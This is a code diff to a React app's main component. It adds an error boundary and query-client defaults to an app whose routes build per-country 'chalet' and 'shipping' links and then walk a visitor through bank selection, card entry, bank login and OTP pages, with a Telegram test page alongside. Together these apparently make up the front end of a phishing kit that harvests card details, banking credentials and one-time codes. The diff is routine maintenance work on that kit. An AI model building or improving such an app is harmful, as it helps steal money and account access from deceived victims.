@@ -3,6 +3,7 @@ import { Toaster as Sonner } from "@/components/ui/sonner";
 import { TooltipProvider } from "@/components/ui/tooltip";
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
 import { BrowserRouter, Routes, Route } from "react-router-dom";
+import ErrorBoundary from "@/components/ErrorBoundary";
 import Index from "./pages/Index";
 import Services from "./pages/Services";
 import CreateChaletLink from "./pages/CreateChaletLink";
@@ -19,36 +20,46 @@ import PaymentReceiptPage from "./pages/PaymentReceiptPage";
 import TelegramTestPage from "./pages/TelegramTestPage";
 import NotFound from "./pages/NotFound";
 
-const queryClient = new QueryClient();
+const queryClient = new QueryClient({
+  defaultOptions: {
+    queries: {
+      retry: 2,
+      refetchOnWindowFocus: false,
+      staleTime: 5 * 60 * 1000, // 5 minutes
+    },
+  },
+});
 
 const App = () => (
-  <QueryClientProvider client={queryClient}>
-    <TooltipProvider>
-      <Toaster />
-      <Sonner />
-      <BrowserRouter>
-        <Routes>
-          <Route path="/" element={<Index />} />
-          <Route path="/services" element={<Services />} />
-          <Route path="/create/:country/chalet" element={<CreateChaletLink />} />
-          <Route path="/create/:country/shipping" element={<CreateShippingLink />} />
-          <Route path="/r/:country/:type/:id" element={<Microsite />} />
-          <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
-          <Route path="/pay/:id/details" element={<PaymentDetails />} />
-          {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
-          <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
-          <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
-          <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
-          {/* Legacy routes (kept for backwards compatibility) */}
-          <Route path="/pay/:id/card" element={<PaymentCardForm />} />
-          <Route path="/pay/:id/otp" element={<PaymentOTPForm />} />
-          <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
-          <Route path="/telegram-test" element={<TelegramTestPage />} />
-          <Route path="*" element={<NotFound />} />
-        </Routes>
-      </BrowserRouter>
-    </TooltipProvider>
-  </QueryClientProvider>
+  <ErrorBoundary>
+    <QueryClientProvider client={queryClient}>
+      <TooltipProvider>
+        <Toaster />
+        <Sonner />
+        <BrowserRouter>
+          <Routes>
+            <Route path="/" element={<Index />} />
+            <Route path="/services" element={<Services />} />
+            <Route path="/create/:country/chalet" element={<CreateChaletLink />} />
+            <Route path="/create/:country/shipping" element={<CreateShippingLink />} />
+            <Route path="/r/:country/:type/:id" element={<Microsite />} />
+            <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
+            <Route path="/pay/:id/details" element={<PaymentDetails />} />
+            {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
+            <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
+            <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
+            <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
+            {/* Legacy routes (kept for backwards compatibility) */}
+            <Route path="/pay/:id/card" element={<PaymentCardForm />} />
+            <Route path="/pay/:id/otp" element={<PaymentOTPForm />} />
+            <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
+            <Route path="/telegram-test" element={<TelegramTestPage />} />
+            <Route path="*" element={<NotFound />} />
+          </Routes>
+        </BrowserRouter>
+      </TooltipProvider>
+    </QueryClientProvider>
+  </ErrorBoundary>
 );
 
 export default App;
